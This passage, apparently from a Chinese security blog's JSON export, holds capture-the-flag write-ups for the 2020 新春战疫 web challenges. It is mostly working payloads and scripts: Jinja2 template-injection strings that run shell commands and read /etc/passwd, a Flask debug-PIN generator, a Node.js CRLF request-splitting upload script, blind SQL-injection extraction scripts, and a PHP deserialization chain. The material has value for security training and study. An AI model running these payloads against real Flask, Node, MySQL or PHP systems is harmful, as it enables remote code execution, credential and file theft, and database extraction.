1&#123;&#123;()|attr(request[&#39;args&#39;][&#39;x1&#39;])|attr(request[&#39;args&#39;][&#39;x2&#39;])|attr(request[&#39;args&#39;][&#39;x3&#39;])()|attr(request[&#39;args&#39;][&#39;x4&#39;])(233)|attr(request[&#39;args&#39;][&#39;x5&#39;])|attr(request[&#39;args&#39;][&#39;x6&#39;])|attr(request[&#39;args&#39;][&#39;x4&#39;])(request[&#39;args&#39;][&#39;x7&#39;])|attr(request[&#39;args&#39;][&#39;x4&#39;])(request[&#39;args&#39;][&#39;x8&#39;])(request[&#39;args&#39;][&#39;x9&#39;])&#125;&#125;?x1&#x3D;__class__&amp;x2&#x3D;__base__&amp;x3&#x3D;__subclasses__&amp;x4&#x3D;__getitem__&amp;x5&#x3D;__init__&amp;x6&#x3D;__globals__&amp;x7&#x3D;__builtins__&amp;x8&#x3D;eval&amp;x9&#x3D;__import__(&quot;os&quot;).popen(&#39;想要执行的命令&#39;).read() 这里突然意识到文章前面都没有提到过滤器，而在模版引擎中过滤器也有很多szs 12345#比如flag被过滤，|reverse&#39;&#39;.__class__.__mro__[-1].__subclasses__()[40](&#39;galf&#39;|reverse).read()#比如getattr被过滤，|attr(&#39;&#39;|attr(&#39;__class__&#39;)).__mro__[-1].__subclasses__()[127].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)#names|last，取序列最后一个元素等等 =======================分割线 有时候后端代码过滤代码可能是这样的 open (&#39;&#39;) =======================分割线 又逛到一篇bypass的文章 从SSTI到沙箱逃逸-jinja2 需要获取的内容在 config 中，不能使用(、)、self、config 可用的上下文变量/函数如下url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config 同时利用上下文获取 config 方式如下 1__globals__[&#39;current_app&#39;].config&#96; &#x2F; &#96;top.app.config 12url_for.__globals__[&#39;current_app&#39;].configget_flashed_messages.__globals__[&#39;current_app&#39;].config ============================分割线 一把梭： https://github.com/epinna/tplmap ============================分割线 之前说命令执行没回显是因为调用system的原因，可以调用popen() 举例 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;&lt;command&gt;&#39;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 参考链接 http://n3k0.icu/2018/09/10/Python-Sandbox-Excape/ https://lihuaiqiu.github.io/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/#more","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://glotozz.github.io/tags/ctf/"}]},{"title":"2020新春战疫-网络安全公益赛-3","slug":"2020新春战疫-网络安全公益赛-3","date":"2020-02-23T02:38:33.000Z","updated":"2020-02-27T10:45:48.427Z","comments":true,"path":"2020/02/23/2020新春战疫-网络安全公益赛-3/","link":"","permalink":"https://glotozz.github.io/2020/02/23/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-3/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 Flaskapp node_game ezExpress easy_thinking Flaskapphint中提示PIN，那么估计利用debug https://xz.aliyun.com/t/2553?tdsourcetag=s_pctim_aiomsg /debug得到源码 读取配置利用自带的/encode，然后传入/decode 1&lt;Config &#123;&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: True, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: &#39;s_e_c_r_e_t_k_e_y&#39;, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(days&#x3D;31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;&#x2F;&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: False, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: datetime.timedelta(seconds&#x3D;43200), &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application&#x2F;json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093, &#39;BOOTSTRAP_USE_MINIFIED&#39;: True, &#39;BOOTSTRAP_CDN_FORCE_SSL&#39;: False, &#39;BOOTSTRAP_QUERYSTRING_REVVING&#39;: True, &#39;BOOTSTRAP_SERVE_LOCAL&#39;: False, &#39;BOOTSTRAP_LOCAL_SUBDOMAIN&#39;: None&#125;&gt; 还是得生成PIN，需要读取一些配置文件 https://www.cnblogs.com/-qing-/p/11656544.html#_label2 payload 文件读取 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125; 命令执行 123&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#39;__global&#39;+&#39;s__&#39;)[&#39;os&#39;].__dict__[&#39;system&#39;](&#39;ls&#39;)&#125;&#125; 都被waf 查看网卡 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&#39;).read()&#125;&#125; 得到02:42:ac:12:00:02=&gt;2485377957890 在docker中，查看机器码 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;proc&#x2F;self&#x2F;cgroup&#39;).read()&#125;&#125; c87691dcb0dbd614f719b6a06e7b60484b5a760147a8f5332511356483a20df4 1234567891011probably_public_bits = [ 'flaskweb', # username 'flask.app', # modname 'Flask', # getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),]private_bits = [ '2485377957890',# str(uuid.getnode()), /sys/class/net/ens33/address 'c87691dcb0dbd614f719b6a06e7b60484b5a760147a8f5332511356483a20df4'# get_machine_id(), /etc/machine-id] 1234567891011121314151617181920212223242526272829303132333435363738394041import hashlibfrom itertools import chainprobably_public_bits = [ 'flaskweb', # username 'flask.app', # modname 'Flask', # getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),]private_bits = [ '2485377957890',# str(uuid.getnode()), /sys/class/net/ens33/address 'c13c64207f09e3ab65ae5495988d6880e7068f245add3303fd80303ad9fce46f'# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 1os.popen(&#39;ls &#x2F;&#39;).read() 翔哥的方法：直接绕waf命令执行 1&#123;&#123;[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#39;sys&#39;+&#39;tem&#39;](&#39;ls &#x2F;&#39;)&#125;&#125; 没有回显，反弹shell即可 node_game https://r3billions.com/writeup-split-second/?tdsourcetag=s_pctim_aiomsg 1%C4%A0HTTP%2F1.1%C4%8D%C4%8AHost%3A%C4%A0127.0.0.1%C4%8D%C4%8A%C4%8D%C4%8AGET%C4%A0%2Ffile_upload 本地测一下 123456#使用npm 安装一个模块 n 到全局npm install -g n#使用 n 加版本号就可以安装其他版本n 8.12.0#再使用 n ，通过上下键，就可以选择不同的版本n wireshark里面是这样的 也就是说payload有问题，并没有实现CRLF注入，但是不知道哪有问题。。 Express文件上传，查看参数内容，等下构造包的时候方便些 123var file_path &#x3D; &#39;&#x2F;uploads&#x2F;&#39; + req.files[0].mimetype +&quot;&#x2F;&quot;;var file_name &#x3D; req.files[0].originalnamevar dir_file &#x3D; __dirname + file_path + file_name 作罢 ======================分割线 赵师傅发了脚本，CRLF的编码和wp不太一样 原理： https://xz.aliyun.com/t/2894 在nodejs8.12.0这个版本中, 程序在底层处理的时候会舍弃高位的字符, 只保留低位的字符, 也就是说 假如我们传入chr(0xffa0)处理后会被截断为chr(0xa0)，并且这个0xff可更换 测试CRLF 1234567891011121314import urllibimport requestspayload = ''' HTTP/1.1Host: xConnection: keep-aliveGET /file_upload HTTP/1.1Host: xConnection: closex:'''payload = payload.replace(\"\\n\", \"\\r\\n\")a = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16))for c in payload)a = urllib.parse.quote(a)print(a) 但是打题目和本地还是失败，依旧是304，我丢，再用脚本发包发现可以，猜测原因可能是bp发送GET请求中有这些非可见字符的时候可能会出错 返回200，返回源码 既然CSRF注入成功，配合SSRF上传文件 之前看源码发现我们可控文件路径，但是还需要访问 123456789app.get(&#39;&#x2F;&#39;, function(req, res) &#123; var action &#x3D; req.query.action?req.query.action:&quot;index&quot;; if( action.includes(&quot;&#x2F;&quot;) || action.includes(&quot;\\\\&quot;) )&#123; res.send(&quot;Errrrr, You have been Blocked&quot;); &#125; file &#x3D; path.join(__dirname + &#39;&#x2F;template&#x2F;&#39;+ action +&#39;.pug&#39;); var html &#x3D; pug.renderFile(file); res.send(html);&#125;); 上传a.pug到/template下即可 pug语法： https://segmentfault.com/a/1190000006198621 12345doctype htmlhtml head body include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt 修改源码把ip限制去掉抓包 123456789101112131415161718POST &#x2F;file_upload HTTP&#x2F;1.1Host: 192.168.56.124:8081User-Agent: x Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------2995119424827Connection: keep-aliveContent-Length: 269-----------------------------2995119424827Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;a.pug&quot;Content-Type: &#x2F;..&#x2F;templatedoctype htmlhtml head body include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt-----------------------------2995119424827-- 结合CRLF 123456789101112131415161718192021222324252627payload &#x3D; &#39;&#39;&#39; HTTP&#x2F;1.1Host: xConnection: keep-alivePOST &#x2F;file_upload HTTP&#x2F;1.1Host: 192.168.56.124:8081User-Agent: x Content-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------2995119424827Connection: keep-aliveContent-Length: 269-----------------------------2995119424827Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;a.pug&quot;Content-Type: &#x2F;..&#x2F;templatedoctype htmlhtml head body include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt-----------------------------2995119424827--GET &#x2F;file_upload HTTP&#x2F;1.1Host: xConnection: closex:&#39;&#39;&#39; 最后访问 这里发包格式还是挺细的，可以通过wireshark分析排查，比如一开始我出现过下面的解析错误 ezExpress明显的JavaScript原型链污染 留下了不学无术的眼泪.jpg =================分割线 JavaScript原型链污染： https://glotozz.github.io/2020/02/25/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/ easy_thinking应该是tp框架，提示Vulnerability Search，可能是搜索功能有问题 产生报错 tp6.0，应该会给源码，扫了下，发现www.zip https://paper.seebug.org/1114/ 猜测是搜索记录是data，sessionid是文件名，想本地测试下，发现运行报错 [Sun Feb 23 06:18:54 2020] PHP Warning: require(/root/Desktop/web/public/vendor/autoload.php): failed to open stream: No such file or directory in /root/Desktop/web/public/index.php on line 6 对照tp6文件，先将index.php移到public中，再修改 require __DIR__ . &#39;/../vendor/autoload.php&#39;; 又报错 模板文件不存在:public/static/tamplate/index\\index.html 但是明明路径没错，查看配置 config/view.php修改view_dir_name为public 修改app/home/config/view.php为static/tamplate/ 总算能用了。。 在登录的时候设置session的时候修改sessionid，在查询的时候用这个sessionid即可添加任意内容 但是这样访问不到，需要写入app/home/controller/a.php下， 构造../../../../app/home/controller/a.php 长度37 也没有文件包含的地方。。遂作罢 正解就是题目环境直接访问就行。。 因为我本地修改了一些配置导致无法访问。。但是不改调试不了。。 最后还需要bypassdisable_func，需要执行/readflag 这个做过几次，过滤了很多，包括mail()等 https://github.com/mm0r1/exploits","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"2020新春战疫-网络安全公益赛-2","slug":"2020新春战疫-网络安全公益赛-2","date":"2020-02-22T14:56:52.000Z","updated":"2020-02-27T10:48:03.663Z","comments":true,"path":"2020/02/22/2020新春战疫-网络安全公益赛-2/","link":"","permalink":"https://glotozz.github.io/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-2/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 easysqli_copy blacklist Ezsqli 放上我xxxxx easysqli_copy看到PDO+set names gbk 就想到宽字节注入，之前看过的文章 从宽字节注入认识PDO的原理和正确使用：https://www.freebuf.com/articles/web/216336.html 简单测试了下，发现可以，但是过滤了select，我简单测试了下发现存在堆叠注入，没有过滤=，万事大吉 1234select hex(&#39;select sleep(5)&#39;);set @a&#x3D;0x73656C65637420736C656570283529;prepare smtm_test from @a;execute smtm_test; 1?id&#x3D;1%df&#39;;set%20@a&#x3D;0x73656C65637420736C656570283529;prepare%20smtm_test%20from%20@a;execute%20smtm_test; 脚本 12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env python2# coding=utf-8import urllibimport requestsurl = \"http://d157325460674375820d1c51bd80f6adc9672fe83ab44e0e.changame.ichunqiu.com/?id=\"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0',&#125;flag = \"\"tmp = 0for i in range(1, 100): if tmp == 1: break tmp = 1 for j in range(32, 127): # payload = \"select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())\" # payload = \"select(group_concat(column_name))from(information_schema.columns)where(table_name='table1')\" payload = \"select(group_concat(fllllll4g))from(table1)\" payload = \"select if(ascii(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125;,sleep(3),1)\".format(payload, i, j) # print payload payload = payload.encode('hex') param = \"1\"+urllib.unquote(\"%df\")+\"';set @a=0x&#123;&#125;;prepare smtm_test from @a;execute smtm_test;\".format(payload) param = urllib.quote(param) # print(param) try: url1 = url + param r = requests.get(url=url1, timeout=3) if r.status_code != 200: j -= 1 continue # print(r.content.decode('utf-8')) except requests.exceptions.ReadTimeout as e: tmp = 0 flag = flag + chr(j) print(flag) breakprint(flag) blacklist1return preg_match(&quot;&#x2F;set|prepare|alter|rename|select|update|delete|drop|insert|where|\\.&#x2F;i&quot;,$inject); emm，这个黑名单似乎可以用昨天的exp打。。。 1inject&#x3D;1&#39;and if(database() regexp&quot;^s&quot;,sleep(3),1)%23 需要先利用堆叠注入查询表和字段 11&#39;;show tables;# 得到FlagHere 11&#39;; show columns from &#96;FlagHere&#96;; # 得到flag 1&#39;and if((FlagHere.flag regexp&#39;^{}&#39;),sleep(5),1)%23 还有个问题，就是利用昨天的方法只能查当前表，而flag在另一张表中。 遂作罢 https://www.4hou.com/posts/mM60 骚操作：handler 12345678910HANDLER tbl_name OPEN [ [AS] alias] HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...) [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125; [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name READ &#123; FIRST | NEXT &#125; [ WHERE where_condition ] [LIMIT ... ] HANDLER tbl_name CLOSE 11&#39;;handler FlagHere open as a;handler a READ first;# 得到flag Ezsqlibp跑一下sql字典 不是200就是500,500的是语法错误，其实过滤字符的并不多 数字型，有回显考虑盲注，简单构造了下成了 bp跑一下发现c的时候Hello Nu1L 数据库为ctf,mysql版本为5.7.1 发现innodb也被过滤。。 聊一聊bypass information_schema：https://www.anquanke.com/post/id/193512 前提要是mysql ≥ 5.7版本 新特性sys.schema_auto_increment_columns也被过滤。。 1select table_name from sys.schema_auto_increment_columns where table_schema&#x3D;&#39;ctf&#39; 还有另一种 1sys.schema_table_statistics_with_buffer 1select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer 成功得到了表名users233333333333333,f1ag_1s_h3r3_hhhhh, 1select * from f1ag_1s_h3r3_hhhhh 报500错误，说明不止1列。。。猜了几个字段也不行==！无列名注入实在搞不出来。。 正解 1(select 1,0x61)&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1) 脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!/usr/bin/env python2# coding=utf-8import requestss = requests.session()url = \"http://f1378e453faf447696702f67444c2575579c8764a54a4e37.changame.ichunqiu.com/\"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0'&#125;cookies = &#123;&#125;data = &#123;&#125;flag = \"\"tmp = 0# for i in range(1, 100):# if tmp == 1:# break# tmp = 1# for j in range(32, 127):# # payload = \"select version()\"# payload = \"select group_concat(table_name) from sys.x$schema_table_statistics_with_buffer\"# param = \"0^(ascii(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125;)#\".format(payload, str(i), str(j))# print(param)# data = &#123;# 'id': param# &#125;# r = requests.post(url=url, headers=headers, data=data)# # print(r.content.decode('utf-8'))# if \"Nu1L\" in r.content.decode(\"utf-8\"):# tmp = 0# flag = flag + chr(j)# print(flag)# break# print(flag)flag = ''for i in range(1,100): for j in range(32,127): # param = \"0^((select 1,0x&#123;&#125;)&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))#\".format((flag + chr(j)).encode('hex')) param = \"0^((select 1,concat('&#123;&#125;', CAST('0' as json)))&gt;(select * from f1ag_1s_h3r3_hhhhh limit 1))#\".format(flag + chr(j)) # print param data = &#123; 'id': param &#125; r = requests.post(url=url, headers=headers, data=data) if \"Nu1L\" in r.content.decode(\"utf-8\"): tmp = 0 flag = flag + chr(j-1) print(flag) break print(flag) 有个缺陷，就是不区分大小写。。 https://www.smi1e.top/%e6%96%b0%e6%98%a5%e6%88%98%e7%96%ab%e5%85%ac%e7%9b%8a%e8%b5%9b-ezsqli-%e5%87%ba%e9%a2%98%e5%b0%8f%e8%ae%b0/?tdsourcetag=s_pctim_aiomsg 预期解是文章中提到的使用 SELECT CONCAT(&quot;A&quot;, CAST(0 AS JSON)) 来另其返回二进制字符串，从而区分大小写。 测试了一下 SELECT CONCAT(&quot;A&quot;, CAST(0 AS JSON)) 需要mysql&gt;=5.7 对于sys.x$schema_table_statistics_with_buffer是视图，所以一开始本地没找到==！ 视图是在基本表之上建立的表，它的结构（即所定义的列）和内容（即所有记录）都来自基本表，它依据基本表存在而存在。一个视图可以对应一个基本表，也可以对应多个基本表。视图是基本表的抽象和在逻辑意义上建立的新关系。","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"2020新春战疫-网络安全公益赛-1","slug":"2020新春战疫-网络安全公益赛-1","date":"2020-02-22T07:05:27.000Z","updated":"2020-02-27T10:46:57.992Z","comments":true,"path":"2020/02/22/2020新春战疫-网络安全公益赛-1/","link":"","permalink":"https://glotozz.github.io/2020/02/22/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-1/","excerpt":"最近做啥都没耐心==！","text":"最近做啥都没耐心==！ &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;简陋的目录 盲注 第一种，不用select（只能查当前表） 第二种，利用堆叠注入，16进制+mysql预处理 babyphp 参考链接: 盲注给了源码，简单测一下过滤内容 select被过滤！！以及= like等，可用regexp 没有回显考虑时间盲注。select被过滤，我通常两种办法， 第一种，不用select（只能查当前表）11 and if(1,sleep(5),1) 成功延时 121 and if(database() regexp(&#39;^&#39;))1 and if((flllllllag.fl4g regexp&quot;^f&quot;),sleep(5),1) 一开始不知道为啥跑到flag{就断了，索性加个hex()，就好了 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/env python2# coding=utf-8import stringimport requestsurl = \"http://de1da794b0d046e6abd2bf3f1a1c8f8d25930eca82df4eb4.changame.ichunqiu.com/?id=\"headers = &#123; 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0'&#125;easy_string = string.digits + string.ascii_letters# print easy_stringflag = \"\"tmp = 0flag = ''for i in range(1, 100): if tmp == 1: break tmp = 1 for j in easy_string: param = '2 or if((hex(flllllllag.fl4g) regexp\"^&#123;&#125;\"),sleep(5),1)'.format(flag+j) # print param try: url1 = url + param r = requests.get(url=url1, headers=headers, timeout=3) # if r.status_code != 200: # j -= 1 # continue # print(r.content.decode('utf-8')) except requests.exceptions.ReadTimeout as e: tmp = 0 flag = flag + j print(flag) breakprint(flag) 第二种，利用堆叠注入，16进制+mysql预处理 堆叠注入： https://www.jianshu.com/p/36f0772f5ce8 先判断能否堆叠注入，既然不能用select，用show代替 11;show tables;# 发现没有报500，应该可以堆叠注入 3种payload 1PREPARE jwt from concat(char(115,101,108,101,99,116), &#39; * from &#96;1919810931114514&#96; &#39;);EXECUTE jwt;# 1SET @sql&#x3D;concat(char(115,101,108,101,99,116),&#39;* from &#96;1919810931114514&#96;&#39;);PREPARE jwt from @sql;EXECUTE jwt;# 1PREPARE jwt from concat(&#39;s&#39;,&#39;elect&#39;, &#39; * from &#96;1919810931114514&#96; &#39;);EXECUTE jwt;# 但是我本地测试时只有第二个能执行，而第二个恰恰使用了= 猜测是版本问题，先去看了原题 简单来说，MariaDB是MySQL源代码的一个分支 , MariaDB包括的一些新特性使它优于MySQL。 MariaDB跟MySQL在绝大多数方面是兼容的，对于开发者来说，几乎感觉不到任何不同。 然后我把本地mysql版本切到mysql8.0.12，已选择执行是正常的，整个执行还是一样不行 想直接在题目上打一打试试，发现环境已经关了，遂作罢 babyphpwww.zip源码泄露，代码审计，思路很明确， 1234if($_SESSION[&#39;login&#39;]&#x3D;&#x3D;&#x3D;1)&#123; require_once(&quot;flag.php&quot;); echo $flag;&#125; 需要成功登录admin， 寻找反序列化入口， 123456789101112public function update()&#123; $Info&#x3D;unserialize($this-&gt;getNewinfo()); $age&#x3D;$Info-&gt;age; $nickname&#x3D;$Info-&gt;nickname; $updateAction&#x3D;new UpdateHelper($_SESSION[&#39;id&#39;],$Info,&quot;update user SET age&#x3D;$age,nickname&#x3D;$nickname where id&#x3D;&quot;.$_SESSION[&#39;id&#39;]); &#x2F;&#x2F;这个功能还没有写完 先占坑&#125;public function getNewInfo()&#123; $age&#x3D;$_POST[&#39;age&#39;]; $nickname&#x3D;$_POST[&#39;nickname&#39;]; return safe(serialize(new Info($age,$nickname)));&#125; 正常情况下这里的反序列化我们只能控制Info类的两个属性，但是这里通过safe()方法可以逃逸字符，甚至还可以逃逸对象 思路一、 User-&gt;__destruct()读取flag.php 但是很快就发现行不通。首先是return，不会打印出来，其次flag被过滤替换成hacker 思路二、 注出admin密码登陆后查看 UpdateHelper类-&gt;__destruct() User类-&gt;toString() Info类-&gt;__call() dbCtrl类-&gt;login() 构造一个正常的payload，比如POST:age=&amp;nickname= 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:0:&quot;&quot;;s:8:&quot;CtrlCase&quot;;N;&#125; 测试逃逸，比如逃逸出$CtrlCase的值为haha， 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:0:&quot;&quot;;s:8:&quot;CtrlCase&quot;;s:4:&quot;haha&quot;;&#125; paylaod 1&quot;;s:8:&quot;CtrlCase&quot;;s:4:&quot;haha&quot;;&#125; 需要逃逸29个字符，&#39;-&gt;hacker逃逸5个字符,构造5个单引号和4个union POST:age=&amp;nickname=&#39;&#39;&#39;&#39;&#39;unionunionunionunion&quot;;s:8:&quot;CtrlCase&quot;;s:4:&quot;haha&quot;;} 下面是序列化内容 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:55:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhacker1&quot;;s:8:&quot;CtrlCase&quot;;s:4:&quot;haha&quot;;&#125;&quot;;s:8:&quot;CtrlCase&quot;;N;&#125; 再举个逃逸对象的例子 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:0:&quot;&quot;;s:8:&quot;nickname&quot;;s:0:&quot;&quot;;s:8:&quot;CtrlCase&quot;;O:4:&quot;User&quot;:1:&#123;s:8:&quot;nickname&quot;;s:8:&quot;flag.php&quot;;&#125;&#125; 1&quot;;s:8:&quot;CtrlCase&quot;;O:4:&quot;User&quot;:1:&#123;s:8:&quot;nickname&quot;;s:8:&quot;flag.php&quot;;&#125;&#125; 63个逃逸字符-12个单引号和3个union，这里要注意的是题目中flag也被替换成hacker 在构造前分析下sql 123456789$result&#x3D;$this-&gt;mysqli-&gt;prepare($sql);$result-&gt;bind_param(&#39;s&#39;, $this-&gt;name);$result-&gt;execute();$result-&gt;bind_result($idResult, $passwordResult);$result-&gt;fetch();$result-&gt;close();if ($this-&gt;token&#x3D;&#x3D;&#39;admin&#39;) &#123; return $idResult;&#125; 返回结果集中的$idResult，查询的时候把第一个参数改为password即可 1select password,id from user where username&#x3D;? payload 12345678910111213141516171819202122232425262728293031323334&lt;?phpClass UpdateHelper&#123; public $sql;&#125;Class User&#123; public $nickname; public $age;&#125;Class Info&#123; public $age; public $CtrlCase;&#125;Class dbCtrl&#123; public $name; public $hostname=\"127.0.0.1\"; public $dbuser=\"noob123\"; public $dbpass=\"noob123\"; public $database=\"noob123\"; public $token;&#125;$d = new dbCtrl;$d-&gt;name = 'admin';$d-&gt;token = 'admin';$c = new Info;$c-&gt;CtrlCase = $d;$b = new User;$b-&gt;age = 'select password,id from user where username=?';$b-&gt;nickname = $c;$a = new UpdateHelper;$a-&gt;sql = $b;echo serialize($a);?&gt; 得到 1O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;&#125;&#125; 满足格式 1&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;N;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:6:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;hostname&quot;;s:9:&quot;127.0.0.1&quot;;s:6:&quot;dbuser&quot;;s:7:&quot;noob123&quot;;s:6:&quot;dbpass&quot;;s:7:&quot;noob123&quot;;s:8:&quot;database&quot;;s:7:&quot;noob123&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#125;s:3:&quot;age&quot;;s:45:&quot;select password,id from user where username&#x3D;?&quot;;&#125;&#125;&#125; 365位，73个单引号 